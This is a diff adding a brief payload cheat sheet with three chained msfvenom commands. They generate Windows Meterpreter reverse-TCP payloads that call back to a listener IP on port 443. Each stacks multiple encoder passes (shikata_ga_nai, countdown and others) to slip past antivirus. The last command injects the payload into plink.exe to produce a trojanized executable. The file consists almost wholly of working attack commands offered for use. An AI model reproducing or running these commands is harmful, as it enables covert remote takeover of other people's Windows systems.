@@ -1,0 +1,22 @@
+CUSTOM-PAYLOADS
+this is a chained command -- enter it one line at a time
+=========================================================
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
+msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+
+========================================================
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.53 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | \
+msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/fnstenv_mov -i 8  -f raw | \
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+
+========================================================
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.234 LPORT=443 R | \
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -t exe -c --platform windows /usr/share/windows-binaries/plink.exe -o beffany.exe
+
